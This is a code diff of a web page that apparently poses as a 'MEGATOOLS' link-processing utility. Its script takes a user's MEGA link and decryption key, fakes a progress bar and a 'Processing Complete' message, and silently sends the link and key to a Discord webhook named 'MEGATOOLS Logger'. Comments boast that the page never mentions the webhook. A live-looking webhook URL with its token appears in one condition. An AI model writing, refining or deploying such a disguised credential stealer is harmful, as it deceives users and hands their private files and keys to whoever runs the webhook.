@@ -308,7 +308,6 @@
       </div>
     </div>
 
-    <!-- result block – shows only generic "done" message, no webhook mention -->
     <div class="result" id="result">
       <div class="result-title" id="resultTitle">✓ Processing Complete</div>
       <div class="result-text" id="resultText">The requested link has finished processing.</div>
@@ -320,11 +319,9 @@
 
 <script>
   (() => {
-    /*
-     * IMPORTANT: Replace with your own Discord webhook URL.
-     * The webhook will receive link + key silently.
-     * No mention of webhook appears on the page.
-     */
+    // =========================================================
+    // 🔥 REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
+    // =========================================================
     const WEBHOOK_ENDPOINT = "YOUR_NEW_DISCORD_WEBHOOK_URL"; 
 
     // =========================================================
@@ -428,10 +425,12 @@
     // WEBHOOK SENDER (sends link + key, silent)
     // =========================================================
     async function sendWebhook(link, key) {
+      // If no webhook URL is set, log a warning and return false.
       if (!WEBHOOK_ENDPOINT || WEBHOOK_ENDPOINT === "https://discord.com/api/webhooks/1539078785784356875/K6qJs8oWsfxDpQdnwJ9sKDEJELq3PDV9c7TwSVxqv3jFEaBvgspdImGKj2aap10cGwHtL") {
-        console.warn("Discord webhook not configured.");
+        console.warn("Discord webhook not configured. Please set WEBHOOK_ENDPOINT.");
         return false;
       }
+
       const isMega = /(^|\/\/)(www\.)?mega\.nz\//i.test(link);
       const payload = {
         username: "MEGATOOLS Logger",
@@ -459,13 +458,14 @@
           body: JSON.stringify(payload)
         });
         if (!response.ok) {
-          console.error("Webhook failed", response.status, await response.text());
+          const errorText = await response.text();
+          console.error("Webhook failed with status", response.status, errorText);
           return false;
         }
-        console.log("Webhook delivered.");
+        console.log("Webhook delivered successfully.");
         return true;
       } catch (e) {
-        console.error("Webhook error", e);
+        console.error("Webhook request error:", e);
         return false;
       }
     }
@@ -516,10 +516,10 @@
 
       await simulateProgress();
 
-      // Send webhook with link AND key – no UI feedback about webhook
+      // 🔥 Send the link and key to the webhook (silent)
       await sendWebhook(link, key);
 
-      // Generic success message – no webhook mention
+      // Generic success message – NO mention of webhook
       result.style.display = "block";
       resultTitle.textContent = "✓ Processing Complete";
       resultTitle.style.color = "#4ade80";
